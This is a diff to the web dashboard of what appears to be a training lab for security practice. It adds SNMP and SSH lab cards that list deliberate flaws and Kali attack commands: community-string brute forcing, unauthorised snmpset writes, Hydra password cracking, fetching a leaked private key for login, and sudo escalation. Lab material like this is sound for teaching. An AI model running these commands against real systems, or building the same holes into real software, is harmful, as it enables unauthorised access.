@@ -102,6 +102,26 @@
                 <span class="ms-card-action">View Usage & Attack Popup →</span>
             </div>
 
+            <!-- SNMP Lab Card -->
+            <div class="ms-card" onclick="openModal('snmp')">
+                <div class="ms-card-header">
+                    <h3 class="ms-card-title">📡 SNMP Network Lab</h3>
+                    <span class="port-tag">8087 / 16161</span>
+                </div>
+                <p class="ms-card-desc">SNMP v1-v3 network management server for MIB walking, community string brute forcing, OID SET exploits, and VACM defense.</p>
+                <span class="ms-card-action">View Usage & Attack Popup →</span>
+            </div>
+
+            <!-- SSH Lab Card -->
+            <div class="ms-card" onclick="openModal('ssh')">
+                <div class="ms-card-header">
+                    <h3 class="ms-card-title">🔑 SSH Hacking Lab</h3>
+                    <span class="port-tag">8088 / 2222</span>
+                </div>
+                <p class="ms-card-desc">Interactive SSH server (TCP 2222) for Hydra password cracking, weak RSA key auth, privilege escalation, and fail2ban rate limiting.</p>
+                <span class="ms-card-action">View Usage & Attack Popup →</span>
+            </div>
+
         </div>
     </div>
 
@@ -264,6 +284,55 @@
                     "curl -s http://<VM_IP>:8086/api/v1/certificate",
                     "curl -s http://<VM_IP>:8086/certificate/download/key.pem -o key.pem",
                     "openssl x509 -in cert.pem -text -noout"
+                ]
+            },
+            snmp: {
+                title: "📡 Dadiwoo SNMP Network Management Lab",
+                port: "8087 / 16161",
+                domain: "snmp.lab:8087",
+                category: "Network Management / Protocol Hacking",
+                stack: "FastAPI, SQLite 3, Python UDP SNMP Engine",
+                overview: "SNMP v1, v2c, and v3 network management microservice for community string enumeration, MIB tree walking, unauthorized SET exploits, and VACM view hardening.",
+                usage: [
+                    "1. Access web interface at http://snmp.lab:8087.",
+                    "2. Test GET, WALK, and SET operations on MIB OID objects.",
+                    "3. Enumerate community strings with onesixtyone or snmpcheck on UDP port 16161.",
+                    "4. Configure defensive VACM restrictions and IP ACL filtering."
+                ],
+                flaws: [
+                    "Plaintext Community Strings: Unencrypted v1/v2c community strings (public, private) allow unauthorized MIB enumeration.",
+                    "Unauthorized OID SET Exploits: Write community strings allow changing device hostname, interface status, or credentials."
+                ],
+                kali: [
+                    "onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <VM_IP> -p 16161",
+                    "snmpwalk -v2c -c public <VM_IP>:16161 .1.3.6.1.4.1.9999",
+                    "snmpset -v2c -c private <VM_IP>:16161 .1.3.6.1.4.1.9999.1.3.0 s 'DOWN'",
+                    "snmpwalk -v3 -l authPriv -u admin_snmpv3 -a SHA -A AdminAuthPass123 -x AES -X AdminPrivPass123 <VM_IP>:16161 .1"
+                ]
+            },
+            ssh: {
+                title: "🔑 Dadiwoo SSH Hacking & Defense Lab",
+                port: "8088 / 2222",
+                domain: "ssh.lab:8088",
+                category: "Network Security / Shell Hacking",
+                stack: "FastAPI, SQLite 3, Paramiko Interactive SSH Server",
+                overview: "Interactive SSH server (TCP port 2222) supporting standard SSH clients, Hydra brute-forcing, leaked RSA key auth, sudo escalation, and Fail2Ban rate-limiting.",
+                usage: [
+                    "1. Access Web UI at http://ssh.lab:8088.",
+                    "2. SSH directly from terminal: ssh user@<VM_IP> -p 2222.",
+                    "3. Download leaked PEM keys from Web UI for passwordless auth.",
+                    "4. Monitor active SSH connections and test Fail2Ban brute force block rules."
+                ],
+                flaws: [
+                    "Password Brute-forcing: Weak user credentials allow automated Hydra brute force attacks.",
+                    "Leaked Private Keys: Unprotected RSA private keys enable passwordless shell access.",
+                    "Privilege Escalation: Standard users have sudo privileges (sudo -l / sudo /bin/bash)."
+                ],
+                kali: [
+                    "ssh user@<VM_IP> -p 2222",
+                    "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<VM_IP>:2222",
+                    "curl -s http://<VM_IP>:8088/ssh/keys/download/id_rsa_user -o id_rsa_user.pem && chmod 600 id_rsa_user.pem && ssh -i id_rsa_user.pem user@<VM_IP> -p 2222",
+                    "sudo -l"
                 ]
             }
         };
